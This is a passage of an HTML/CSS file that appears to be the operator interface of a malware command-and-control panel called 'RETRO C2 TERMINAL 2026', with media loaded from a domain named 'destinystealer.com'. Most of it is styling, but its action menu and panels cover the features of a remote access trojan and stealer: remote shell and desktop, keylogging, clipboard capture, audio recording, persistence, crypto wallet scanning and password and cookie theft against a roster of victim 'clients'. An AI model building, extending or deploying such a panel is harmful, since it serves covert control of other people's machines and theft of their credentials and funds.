    background: rgba(0, 255, 0, 0.05);
}

.registry-key-item.selected {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.1);
}

.key-icon {
    font-size: 1.1em;
}

.registry-value-item {
    display: grid;
    grid-template-columns: 200px 100px 1fr;
    gap: 15px;
    padding: 10px;
    margin: 5px 0;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
    cursor: pointer;
    transition: all 0.2s ease;
}

.registry-value-item:hover {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.05);
}

.value-name {
    font-weight: bold;
    color: #00ffff;
    overflow: hidden;
    text-overflow: ellipsis;
}

.value-type {
    color: #ff6600;
    font-size: 0.9em;
}

.value-data {
    color: #00ff00;
    font-family: 'Courier New', monospace;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.registry-status {
    padding: 10px 15px;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
    text-align: center;
}

.registry-dialog {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #000000;
    border: 2px solid #00ff00;
    border-radius: 10px;
    padding: 25px;
    min-width: 500px;
    box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
    z-index: 1000;
}

.registry-dialog h3 {
    text-align: center;
    color: #00ff00;
    margin: 0 0 20px 0;
    animation: glow 2s ease-in-out infinite;
}

.registry-dialog input,
.registry-dialog select,
.registry-dialog textarea {
    width: 100%;
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 10px;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
    margin-bottom: 15px;
}

.registry-dialog input:focus,
.registry-dialog select:focus,
.registry-dialog textarea:focus {
    border-color: #00ff00;
    outline: none;
}

.registry-dialog textarea {
    min-height: 100px;
    resize: vertical;
}

.no-selection {
    text-align: center;
    padding: 50px;
    color: #666;
    font-style: italic;
}


.network-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 15px;
}

.network-tabs {
    display: flex;
    gap: 10px;
    padding: 10px;
    border-bottom: 2px solid #004400;
    background: rgba(0, 255, 0, 0.02);
}

.network-tab {
    background: transparent;
    border: 2px solid #004400;
    color: #00ff00;
    padding: 10px 20px;
    border-radius: 5px 5px 0 0;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
}

.network-tab:hover {
    background: rgba(0, 255, 0, 0.1);
}

.network-tab.active {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.2);
    border-bottom: 2px solid #000000;
    position: relative;
    top: 2px;
}

.network-panel {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 15px;
}

/* Connections Tab */
.connections-controls {
    display: flex;
    gap: 15px;
    align-items: center;
    padding: 15px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
    flex-wrap: wrap;
}

.connection-filter {
    flex: 1;
    min-width: 200px;
}

.connection-filter input {
    width: 100%;
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
}

.connection-filter input:focus {
    border-color: #00ff00;
    outline: none;
}

.network-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 8px 16px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
}

.network-btn:hover:not(:disabled) {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
}

.network-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

.network-btn.danger {
    border-color: #ff0000;
    color: #ff0000;
}

.network-btn.danger:hover:not(:disabled) {
    background: rgba(255, 0, 0, 0.2);
    box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
}

.network-btn.primary {
    border-color: #00ffff;
    color: #00ffff;
}

.network-btn.primary:hover:not(:disabled) {
    background: rgba(0, 255, 255, 0.2);
    box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
}

#netstatMonitorBtn.active {
    border-color: #ff6600;
    color: #ff6600;
    animation: pulse 2s ease-in-out infinite;
}

.connections-list-container {
    flex: 1;
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

.connections-header {
    display: grid;
    grid-template-columns: 80px 200px 200px 100px 1fr;
    gap: 10px;
    padding: 10px 15px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 1px solid #004400;
    font-weight: bold;
}

.connections-list {
    flex: 1;
    overflow-y: auto;
    padding: 5px;
}

.connection-item {
    display: grid;
    grid-template-columns: 80px 200px 200px 100px 1fr;
    gap: 10px;
    padding: 8px 10px;
    margin: 2px 0;
    border: 1px solid transparent;
    border-radius: 3px;
    cursor: pointer;
    transition: all 0.2s ease;
    align-items: center;
    font-size: 0.9em;
}

.connection-item:hover {
    border-color: #004400;
    background: rgba(0, 255, 0, 0.05);
}

.connection-item.selected {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.1);
}

.connection-protocol {
    color: #ff6600;
    font-weight: bold;
}

.connection-state {
    color: #00ffff;
}

.connections-status {
    display: flex;
    justify-content: space-between;
    padding: 10px 15px;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
}

/* Port Scanner Tab */
.scanner-controls {
    display: flex;
    flex-direction: column;
    gap: 15px;
    padding: 20px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
}

.scanner-input-section {
    display: flex;
    gap: 10px;
    align-items: center;
    flex-wrap: wrap;
}

.scanner-input-section input {
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 10px;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
}

.scanner-input-section input:focus {
    border-color: #00ff00;
    outline: none;
}

#scanTargetInput {
    flex: 1;
    min-width: 200px;
}

#scanStartPort, #scanEndPort {
    width: 120px;
}

.scan-presets {
    display: flex;
    gap: 10px;
}

.preset-btn {
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 5px 15px;
    border-radius: 3px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-size: 0.85em;
    transition: all 0.2s ease;
}

.preset-btn:hover {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.1);
}

.scan-progress-section {
    padding: 15px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
}

.scan-info {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
    font-weight: bold;
}

.scan-results-container {
    flex: 1;
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

.scan-results-header {
    padding: 10px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 1px solid #004400;
    text-align: center;
    font-weight: bold;
    animation: glow 3s ease-in-out infinite;
}

.scan-results {
    flex: 1;
    overflow-y: auto;
    padding: 15px;
}

.port-item {
    display: flex;
    justify-content: space-between;
    padding: 10px;
    margin: 5px 0;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
    animation: slideIn 0.3s ease-out;
}

@keyframes slideIn {
    from {
        opacity: 0;
        transform: translateX(-20px);
    }
    to {
        opacity: 1;
        transform: translateX(0);
    }
}

.port-number {
    color: #00ffff;
    font-weight: bold;
    font-size: 1.1em;
}

.port-service {
    color: #ff6600;
}

.scanner-status {
    padding: 10px;
    text-align: center;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
}

.no-results {
    text-align: center;
    padding: 50px;
    color: #666;
    font-style: italic;
}


.audio-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 20px;
}

.audio-controls {
    display: flex;
    gap: 20px;
    padding: 20px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
    flex-wrap: wrap;
}

.audio-device-section {
    display: flex;
    gap: 10px;
    align-items: center;
    flex: 1;
}

.audio-device-select {
    background: #000000;
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Orbitron', monospace;
    cursor: pointer;
    flex: 1;
}

.audio-duration-section {
    display: flex;
    gap: 10px;
    align-items: center;
}

.audio-duration-section input {
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
    width: 80px;
}

.audio-duration-section input:focus {
    border-color: #00ff00;
    outline: none;
}

.duration-info {
    color: #666;
    font-size: 0.85em;
}

.audio-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 8px 16px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
}

.audio-btn:hover {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
}

.audio-record-section {
    padding: 30px;
    border: 2px solid #004400;
    border-radius: 8px;
    background: #000000;
    text-align: center;
}

.record-visualizer {
    display: flex;
    justify-content: center;
    gap: 5px;
    height: 60px;
    margin-bottom: 30px;
}

.visualizer-bar {
    width: 8px;
    background: #004400;
    border-radius: 4px;
    transition: all 0.3s ease;
}

.recording .visualizer-bar {
    background: #00ff00;
    animation: pulse-bar 0.8s ease-in-out infinite;
}

.recording .visualizer-bar:nth-child(1) { animation-delay: 0s; }
.recording .visualizer-bar:nth-child(2) { animation-delay: 0.1s; }
.recording .visualizer-bar:nth-child(3) { animation-delay: 0.2s; }
.recording .visualizer-bar:nth-child(4) { animation-delay: 0.3s; }
.recording .visualizer-bar:nth-child(5) { animation-delay: 0.4s; }

@keyframes pulse-bar {
    0%, 100% { 
        height: 20px;
        opacity: 0.3;
    }
    50% { 
        height: 60px;
        opacity: 1;
    }
}

.record-controls {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 30px;
    margin-bottom: 20px;
}

.record-btn {
    background: transparent;
    border: 3px solid #00ff00;
    color: #00ff00;
    padding: 15px 30px;
    border-radius: 50px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 1.1em;
}

.record-btn:hover {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
    transform: scale(1.05);
}

.record-btn.recording {
    border-color: #ff0000;
    color: #ff0000;
    animation: pulse-red 2s ease-in-out infinite;
}

.record-btn.recording:hover {
    background: rgba(255, 0, 0, 0.2);
    box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
}

.record-icon {
    font-size: 1.5em;
}

.record-status {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 20px;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 0, 0, 0.5);
}

.status-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: #444;
}

.status-dot.active {
    background: #00ff00;
    animation: blink 1s infinite;
}

.status-dot.recording {
    background: #ff0000;
    animation: blink 0.5s infinite;
}

.record-timer {
    margin-top: 20px;
}

.timer-text {
    display: block;
    font-size: 1.2em;
    font-weight: bold;
    margin-bottom: 10px;
    color: #00ffff;
}

.timer-bar-container {
    width: 100%;
    height: 10px;
    background: rgba(0, 255, 0, 0.1);
    border: 1px solid #004400;
    border-radius: 5px;
    overflow: hidden;
}

.timer-bar {
    height: 100%;
    background: linear-gradient(90deg, #00ff00, #00ffff);
    width: 0%;
    transition: width 1s linear;
}

.audio-recordings {
    flex: 1;
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

.recordings-header {
    padding: 10px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 1px solid #004400;
    text-align: center;
    font-weight: bold;
    animation: glow 3s ease-in-out infinite;
}

.recordings-list {
    flex: 1;
    overflow-y: auto;
    padding: 15px;
}

.recording-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px;
    margin: 8px 0;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
    transition: all 0.2s ease;
}

.recording-item:hover {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.05);
}

.recording-info {
    display: flex;
    flex-direction: column;
    gap: 5px;
}

.recording-name {
    color: #00ffff;
    font-weight: bold;
}

.recording-details {
    font-size: 0.85em;
    color: #666;
}

.recording-actions {
    display: flex;
    gap: 10px;
}

.recording-btn {
    background: transparent;
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 5px 15px;
    border-radius: 3px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-size: 0.85em;
    transition: all 0.2s ease;
}

.recording-btn:hover {
    background: rgba(0, 255, 0, 0.2);
}

.audio-status {
    padding: 10px;
    text-align: center;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
}

.no-recordings {
    text-align: center;
    padding: 50px;
    color: #666;
    font-style: italic;
}

.persistence-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 20px;
}

.persistence-status-section {
    padding: 20px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
}

.status-card {
    text-align: center;
}

.status-card-header {
    font-size: 1.2em;
    font-weight: bold;
    margin-bottom: 20px;
    animation: glow 3s ease-in-out infinite;
}

.status-card-body {
    margin-bottom: 20px;
}

.persistence-main-status {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 15px;
    font-size: 1.3em;
    font-weight: bold;
    margin-bottom: 15px;
}

#persistenceIndicator {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: #444;
    position: relative;
}

#persistenceIndicator.active {
    background: #00ff00;
    animation: pulse 2s ease-in-out infinite;
}

#persistenceIndicator.inactive {
    background: #ff0000;
}

#persistenceIndicator::before {
    content: '';
    position: absolute;
    top: -5px;
    left: -5px;
    right: -5px;
    bottom: -5px;
    border-radius: 50%;
    border: 2px solid currentColor;
    opacity: 0.3;
}

.installed-methods {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    justify-content: center;
    margin-top: 15px;
}

.method-tag {
    padding: 5px 15px;
    background: rgba(0, 255, 0, 0.2);
    border: 1px solid #00ff00;
    border-radius: 20px;
    font-size: 0.9em;
    color: #00ff00;
    animation: fadeIn 0.5s ease-out;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}

.persistence-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 10px 25px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
}

.persistence-btn:hover {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
}

.persistence-btn.danger {
    border-color: #ff0000;
    color: #ff0000;
}

.persistence-btn.danger:hover {
    background: rgba(255, 0, 0, 0.2);
    box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
}

.persistence-methods {
    flex: 1;
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow-y: auto;
    padding: 20px;
}

.methods-header {
    text-align: center;
    font-size: 1.1em;
    font-weight: bold;
    margin-bottom: 20px;
    animation: glow 3s ease-in-out infinite;
}

.method-group {
    margin-bottom: 30px;
}

.method-group-title {
    font-size: 1.1em;
    font-weight: bold;
    color: #00ffff;
    margin-bottom: 15px;
    padding-bottom: 10px;
    border-bottom: 1px solid #004400;
}

.method-card {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 15px;
    margin: 10px 0;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
    transition: all 0.3s ease;
}

.method-card:hover {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.05);
    transform: translateX(5px);
}

.method-info {
    flex: 1;
}

.method-name {
    font-weight: bold;
    color: #00ff00;
    margin-bottom: 5px;
}

.method-desc {
    font-size: 0.85em;
    color: #888;
}

.method-btn {
    background: transparent;
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 8px 20px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
}

.method-btn:hover {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
}

.method-btn.admin {
    border-color: #ff6600;
    color: #ff6600;
}

.method-btn.admin:hover {
    background: rgba(255, 102, 0, 0.2);
    box-shadow: 0 0 10px rgba(255, 102, 0, 0.5);
}

.persistence-actions {
    padding: 20px;
    text-align: center;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
}

.persistence-log {
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow: hidden;
}

.log-header {
    padding: 10px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 1px solid #004400;
    text-align: center;
    font-weight: bold;
}

.log-content {
    padding: 15px;
    max-height: 150px;
    overflow-y: auto;
    font-family: 'Courier New', monospace;
    font-size: 0.9em;
}

.log-entry {
    margin: 5px 0;
    padding: 5px 10px;
    border-left: 2px solid #004400;
}

.log-entry.success {
    border-left-color: #00ff00;
    color: #00ff00;
}

.log-entry.error {
    border-left-color: #ff0000;
    color: #ff0000;
}

.log-entry.info {
    border-left-color: #00ffff;
    color: #00ffff;
}

.log-timestamp {
    color: #666;
    font-size: 0.85em;
    margin-right: 10px;
}


.wallet-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 20px;
}

.wallet-controls {
    display: flex;
    gap: 30px;
    align-items: center;
    padding: 20px;
    border: 2px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
    position: relative;
    overflow: hidden;
}

.wallet-controls::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
    animation: scan-effect 3s linear infinite;
}

@keyframes scan-effect {
    0% { left: -100%; }
    100% { left: 100%; }
}

.wallet-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 12px 30px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
    font-size: 1.1em;
}

.wallet-btn:hover:not(:disabled) {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
    transform: scale(1.05);
}

.wallet-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

.wallet-btn.primary {
    border-color: #00ffff;
    color: #00ffff;
}

.wallet-btn.primary:hover:not(:disabled) {
    background: rgba(0, 255, 255, 0.2);
    box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
}

.wallet-btn.scanning {
    animation: pulse 1s ease-in-out infinite;
}

.scan-stats {
    display: flex;
    gap: 30px;
    margin-left: auto;
}

.stat-item {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 5px;
}

.stat-label {
    font-size: 0.85em;
    color: #888;
    text-transform: uppercase;
}

.stat-value {
    font-size: 1.3em;
    font-weight: bold;
    color: #00ffff;
    font-family: 'Orbitron', monospace;
    text-shadow: 0 0 5px #00ffff;
}

#scanStatus {
    color: #00ff00;
}

.wallet-info {
    padding: 20px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
}

.info-card {
    text-align: center;
}

.info-title {
    font-size: 1.1em;
    font-weight: bold;
    margin-bottom: 20px;
    animation: glow 3s ease-in-out infinite;
}

.info-content {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 20px;
}

.wallet-category {
    text-align: left;
    padding: 15px;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
}

.category-title {
    font-weight: bold;
    color: #00ffff;
    margin-bottom: 10px;
    font-size: 0.95em;
}

.wallet-list {
    font-size: 0.85em;
    color: #888;
    line-height: 1.6;
}

.wallet-results {
    flex: 1;
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

.results-header {
    padding: 10px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 1px solid #004400;
    text-align: center;
    font-weight: bold;
    animation: glow 3s ease-in-out infinite;
}

.results-filter {
    display: flex;
    gap: 10px;
    padding: 10px;
    border-bottom: 1px solid #004400;
    justify-content: center;
}

.filter-btn {
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 5px 15px;
    border-radius: 3px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-size: 0.85em;
    transition: all 0.2s ease;
}

.filter-btn:hover {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.1);
}

.filter-btn.active {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.2);
}

.results-list {
    flex: 1;
    overflow-y: auto;
    padding: 15px;
}

.wallet-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px;
    margin: 8px 0;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
    transition: all 0.2s ease;
    animation: slideIn 0.3s ease-out;
}

.wallet-item:hover {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.05);
}

.wallet-item.downloaded {
    border-color: #00ffff;
    background: rgba(0, 255, 255, 0.05);
}

.wallet-details {
    flex: 1;
}

.wallet-type {
    font-weight: bold;
    color: #00ff00;
    margin-bottom: 5px;
}

.wallet-path {
    font-size: 0.85em;
    color: #888;
    font-family: 'Courier New', monospace;
    word-break: break-all;
}

.wallet-meta {
    display: flex;
    gap: 15px;
    margin-top: 5px;
    font-size: 0.85em;
    color: #666;
}

.wallet-size {
    color: #ff6600;
}

.wallet-category-tag {
    color: #00ffff;
    text-transform: uppercase;
    font-size: 0.8em;
}

.wallet-actions {
    display: flex;
    gap: 10px;
}

.wallet-action-btn {
    background: transparent;
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 5px 15px;
    border-radius: 3px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-size: 0.85em;
    transition: all 0.2s ease;
}

.wallet-action-btn:hover:not(:disabled) {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
}

.wallet-action-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

.wallet-action-btn.downloaded {
    border-color: #00ffff;
    color: #00ffff;
}

.wallet-download-progress {
    padding: 20px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
}

.download-info {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
    font-weight: bold;
}

#downloadingWallet {
    color: #00ffff;
}

#downloadProgress {
    color: #00ff00;
}

.no-results {
    text-align: center;
    padding: 50px;
    color: #666;
    font-style: italic;
}

/* Troll Panel Styles */
.troll-container {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 20px;
    height: 100%;
    padding: 20px;
}

.troll-card {
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
    display: flex;
    flex-direction: column;
}

.troll-card-header {
    padding: 10px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 1px solid #004400;
    text-align: center;
    font-weight: bold;
}

.troll-card-body {
    padding: 20px;
    display: flex;
    flex-direction: column;
    gap: 15px;
    flex: 1;
}

.troll-card-body input,
.troll-card-body textarea {
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 10px;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
}

.troll-card-body input:focus,
.troll-card-body textarea:focus {
    border-color: #00ff00;
    outline: none;
}

.troll-card-body textarea {
    min-height: 100px;
    resize: vertical;
    flex: 1;
}

.troll-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 10px 20px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
    text-align: center;
}

.troll-btn:hover {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
}

/* System Info Panel Styles */
.sysinfo-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 15px;
}

.sysinfo-tabs {
    display: flex;
    gap: 10px;
    padding-bottom: 10px;
    border-bottom: 1px solid #004400;
}

.sysinfo-tab {
    background: transparent;
    border: 2px solid #004400;
    color: #00ff00;
    padding: 8px 16px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
}

.sysinfo-tab:hover {
    background: rgba(0, 255, 0, 0.1);
}

.sysinfo-tab.active {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.2);
}

.sysinfo-panel {
    flex: 1;
    overflow-y: auto;
    padding: 10px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
}

.sysinfo-grid {
    display: grid;
    grid-template-columns: 200px 1fr;
    gap: 10px;
    font-family: 'Courier New', monospace;
    line-height: 1.6;
}

.sysinfo-label {
    font-weight: bold;
    color: #00ffff;
    text-align: right;
}

.sysinfo-value {
    color: #00ff00;
    white-space: pre-wrap;
    word-break: break-all;
}

.sysinfo-table {
    width: 100%;
    border-collapse: collapse;
    font-family: 'Courier New', monospace;
}

.sysinfo-table th, .sysinfo-table td {
    border: 1px solid #004400;
    padding: 8px;
    text-align: left;
}

.sysinfo-table th {
    background: rgba(0, 255, 0, 0.1);
    font-weight: bold;
}

/* Custom Script Panel Styles */
.script-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 15px;
}

.script-controls {
    display: flex;
    gap: 15px;
    align-items: center;
}

.script-type-select {
    background: #000000;
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Orbitron', monospace;
}

.script-editor-container {
    flex: 1;
    display: flex;
    flex-direction: column;
    border: 1px solid #004400;
    border-radius: 8px;
    overflow: hidden;
}

.script-editor {
    flex: 1;
    background: #0a0a0a;
    border: none;
    color: #00ff00;
    padding: 15px;
    font-family: 'Courier New', monospace;
    font-size: 14px;
    resize: none;
    outline: none;
}

.script-output {
    height: 200px;
    background: #000;
    border-top: 1px solid #004400;
    padding: 15px;
    overflow-y: auto;
    font-family: 'Courier New', monospace;
    white-space: pre-wrap;
    word-break: break-all;
}

.fm-search-section {
    display: flex;
    gap: 10px;
    align-items: center;
    padding-bottom: 15px;
    border-bottom: 1px solid #004400;
    margin: 0 15px 15px 15px;
}

.fm-search-input {
    flex: 1;
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
}
.script-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 15px;
}

.script-controls {
    display: flex;
    gap: 15px;
    align-items: center;
}

.script-type-select {
    background: #000000;
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Orbitron', monospace;
}

.script-editor-container {
    flex: 1;
    display: flex;
    flex-direction: column;
    border: 1px solid #004400;
    border-radius: 8px;
    overflow: hidden;
}

.script-editor {
    flex: 1;
    background: #0a0a0a;
    border: none;
    color: #00ff00;
    padding: 15px;
    font-family: 'Courier New', monospace;
    font-size: 14px;
    resize: none;
    outline: none;
}

.script-output {
    height: 200px;
    background: #000;
    border-top: 1px solid #004400;
    padding: 15px;
    overflow-y: auto;
    font-family: 'Courier New', monospace;
    white-space: pre-wrap;
    word-break: break-all;
}

    </style>
</head>
<body>
     <video id="bgVideo" autoplay muted loop playsinline>
        <source src="http://destinystealer.com/movie.mp4" type="video/mp4">
        <!-- You can replace the src with your own 4K video URL -->
    </video>
    
    <!-- Background Audio -->
    <audio id="bgMusic" loop>
        <source src="http://destinystealer.com/playboi.mp3" type="audio/mpeg">
        <!-- You can replace the src with your own music URL -->
    </audio>
    <div class="container">
        <div class="header">
            <h1> RETRO C2 TERMINAL 2026 </h1>
            <div class="status">
                <span class="connection-status" id="connectionStatus"></span>
                <span id="statusText">CONNECTING...</span> | 
                <span id="clientCount">0</span> ACTIVE CLIENTS
            </div>
        </div>
        
        <div class="clients-panel">
            <div class="panel-title"> CLIENT ROSTER </div>
            <div class="clients-list" id="clientsList">
                <div class="no-clients">NO ACTIVE CLIENTS</div>
            </div>
        </div>
        
        <div class="terminal-panel">
            <div class="panel-title"> COMMAND TERMINAL </div>
            <div class="shell-selector">
                <label>ACTION: </label>
                <select id="shellType">
                    <option value="cmd">CMD</option>
                    <option value="powershell">PowerShell</option>
                    <option value="remote-desktop">Remote Desktop</option>
                    <option value="remote-execute">Remote Execute</option>
                    <option value="file-manager">File Manager</option>
                    <option value="process-manager">Process Manager</option>
                    <option value="clipboard-manager">ClipBoard Manager</option>
                    <option value="keylog-manager">Keylog Manager</option>
                   <option value="registry-editor">Registry Manager</option>
                   <option value="network-tools">Network Tools</option>
                   <option value="audio-recorder">Audio Recorder</option>
                   <option value="persistence">Persistence</option>
                   <option value="wallet-scanner">Wallet Scanner</option>
                   <option value="troll-panel">Troll Panel</option>
                   <option value="system-info">System Information</option>
                   <option value="script-execution">Script Execution</option>
                   <option value="password-recovery">Passwords/Cookies Recovery</option>
                  
                </select>
            </div>
            <div class="terminal" id="terminal">
                <div class="terminal-output">SYSTEM READY - SELECT CLIENT TO BEGIN</div>
